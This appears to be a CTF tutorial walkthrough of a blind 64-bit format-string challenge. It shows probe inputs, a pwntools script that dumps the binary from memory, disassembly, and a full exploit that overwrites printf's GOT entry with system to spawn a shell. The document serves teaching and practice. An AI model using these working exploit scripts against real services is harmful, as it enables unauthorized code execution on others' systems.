The source code and deployment files are all in the [blind_fmt_got](https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/linux/user-mode/fmtstr/blind_fmt_got) folder.

#### Determining the Program's Bitness

Through simple testing, we found that this program has a format string vulnerability function, and the program is 64-bit.

```shell
➜  blind_fmt_got git:(master) ✗ nc localhost 9999
%p
0x7fff3b9774c0
```

This time nothing was echoed. After more attempts, we found nothing useful either, so we have no choice but to leak the source program.

#### Determining the Offset

Before leaking the program, we still need to determine the format string offset, as follows:

```shell
➜  blind_fmt_got git:(master) ✗ nc localhost 9999
aaaaaaaa%p%p%p%p%p%p%p%p%p
aaaaaaaa0x7ffdbf920fb00x800x7f3fc9ccd2300x4006b00x7f3fc9fb0ab00x61616161616161610x70257025702570250x70257025702570250xa7025
```

From this, we can determine that the starting address offset of the format string is 6.

#### Leaking the Binary

Since the program is 64-bit, we start leaking from 0x400000. Generally speaking, blind exploits with format string vulnerabilities can read '\x00' characters — otherwise there's no way to leak anything. However, the output is necessarily '\x00'-terminated, because the output functions exploited by format string vulnerabilities are all '\x00'-terminated. So we can use the following leaking code.

```python
##coding=utf8
from pwn import *

##context.log_level = 'debug'
ip = "127.0.0.1"
port = 9999


def leak(addr):
    # leak addr for three times
    num = 0
    while num < 3:
        try:
            print 'leak addr: ' + hex(addr)
            sh = remote(ip, port)
            payload = '%00008$s' + 'STARTEND' + p64(addr)
            # This means there's a \n, causing a new line
            if '\x0a' in payload:
                return None
            sh.sendline(payload)
            data = sh.recvuntil('STARTEND', drop=True)
            sh.close()
            return data
        except Exception:
            num += 1
            continue
    return None

def getbinary():
	addr = 0x400000
	f = open('binary', 'w')
	while addr < 0x401000:
		data = leak(addr)
		if data is None:
			f.write('\xff')
			addr += 1
		elif len(data) == 0:
			f.write('\x00')
			addr += 1
		else:
			f.write(data)
			addr += len(data)
	f.close()
getbinary()
```

Note that in the payload, we need to check if '\n' appears, because this would cause the source program to only read the content before it, making it impossible to leak memory. So such addresses need to be skipped.

#### Analyzing the Binary

Open the leaked binary with IDA, change the program base address, and take a brief look. We can basically determine the main function address of the source program:

```asm
seg000:00000000004005F6                 push    rbp
seg000:00000000004005F7                 mov     rbp, rsp
seg000:00000000004005FA                 add     rsp, 0FFFFFFFFFFFFFF80h
seg000:00000000004005FE
seg000:00000000004005FE loc_4005FE:                             ; CODE XREF: seg000:0000000000400639j
seg000:00000000004005FE                 lea     rax, [rbp-80h]
seg000:0000000000400602                 mov     edx, 80h ; '€'
seg000:0000000000400607                 mov     rsi, rax
seg000:000000000040060A                 mov     edi, 0
seg000:000000000040060F                 mov     eax, 0
seg000:0000000000400614                 call    sub_4004C0
seg000:0000000000400619                 lea     rax, [rbp-80h]
seg000:000000000040061D                 mov     rdi, rax
seg000:0000000000400620                 mov     eax, 0
seg000:0000000000400625                 call    sub_4004B0
seg000:000000000040062A                 mov     rax, cs:601048h
seg000:0000000000400631                 mov     rdi, rax
seg000:0000000000400634                 call    near ptr unk_4004E0
seg000:0000000000400639                 jmp     short loc_4005FE
```

We can basically determine that sub\_4004C0 is the read function, since a read-in function with three arguments is basically read. Also, sub\_4004B0 called below should be the output function, and after that another function is called, after which it jumps back to the read function. So the program should be a while 1 loop that keeps executing.

#### Exploitation Strategy

After analyzing the above, we can determine the following basic strategy:

- Leak the address of the printf function
- Obtain the corresponding libc and the system function address
- Modify the printf address to the system function address
- Read in /bin/sh; to obtain a shell

#### Exploit Program

The program is as follows.

```python
##coding=utf8
import math
from pwn import *
from LibcSearcher import LibcSearcher
##context.log_level = 'debug'
context.arch = 'amd64'
ip = "127.0.0.1"
port = 9999


def leak(addr):
    # leak addr for three times
    num = 0
    while num < 3:
        try:
            print 'leak addr: ' + hex(addr)
            sh = remote(ip, port)
            payload = '%00008$s' + 'STARTEND' + p64(addr)
            # This means there's a \n, causing a new line
            if '\x0a' in payload:
                return None
            sh.sendline(payload)
            data = sh.recvuntil('STARTEND', drop=True)
            sh.close()
            return data
        except Exception:
            num += 1
            continue
    return None


def getbinary():
    addr = 0x400000
    f = open('binary', 'w')
    while addr < 0x401000:
        data = leak(addr)
        if data is None:
            f.write('\xff')
            addr += 1
        elif len(data) == 0:
            f.write('\x00')
            addr += 1
        else:
            f.write(data)
            addr += len(data)
    f.close()


##getbinary()
read_got = 0x601020
printf_got = 0x601018
sh = remote(ip, port)
## let the read get resolved
sh.sendline('a')
sh.recv()
## get printf addr
payload = '%00008$s' + 'STARTEND' + p64(read_got)
sh.sendline(payload)
data = sh.recvuntil('STARTEND', drop=True).ljust(8, '\x00')
sh.recv()
read_addr = u64(data)

## get system addr
libc = LibcSearcher('read', read_addr)
libc_base = read_addr - libc.dump('read')
system_addr = libc_base + libc.dump('system')
log.success('system addr: ' + hex(system_addr))
log.success('read   addr: ' + hex(read_addr))
## modify printf_got
payload = fmtstr_payload(6, {printf_got: system_addr}, 0, write_size='short')
## get all the addr
addr = payload[:32]
payload = '%32d' + payload[32:]
offset = (int)(math.ceil(len(payload) / 8.0) + 1)
for i in range(6, 10):
    old = '%{}$'.format(i)
    new = '%{}$'.format(offset + i)
    payload = payload.replace(old, new)
remainer = len(payload) % 8
payload += (8 - remainer) * 'a'
payload += addr
sh.sendline(payload)
sh.recv()

## get shell
sh.sendline('/bin/sh;')
sh.interactive()
```

Here we need to pay attention to this section of code:

```python
## modify printf_got
payload = fmtstr_payload(6, {printf_got: system_addr}, 0, write_size='short')
## get all the addr
addr = payload[:32]
payload = '%32d' + payload[32:]
offset = (int)(math.ceil(len(payload) / 8.0) + 1)
for i in range(6, 10):
    old = '%{}$'.format(i)
    new = '%{}$'.format(offset + i)
    payload = payload.replace(old, new)
remainer = len(payload) % 8
payload += (8 - remainer) * 'a'
payload += addr
sh.sendline(payload)
sh.recv()
```

The payload directly obtained from fmtstr\_payload will place the addresses at the beginning, which will cause printf to encounter '\x00' truncation (**regarding this issue, pwntools is currently developing an enhanced version of fmt\_payload, which should be coming out soon**). So I used some tricks to place them at the end. The main idea is to place the addresses at an 8-byte aligned position at the end, and modify the offsets in the payload. Note that:

```python
offset = (int)(math.ceil(len(payload) / 8.0) + 1)
```

This line gives the offset of the modified addresses in the format string. The reason it's like this is that regardless of how we modify it, the extra characters from '%order$hn' where order increases will never exceed 8. You can derive the specifics yourself.

### Challenges
- SuCTF2018 - lock2 (Organizers provided a Docker image: suctf/2018-pwn-lock2)
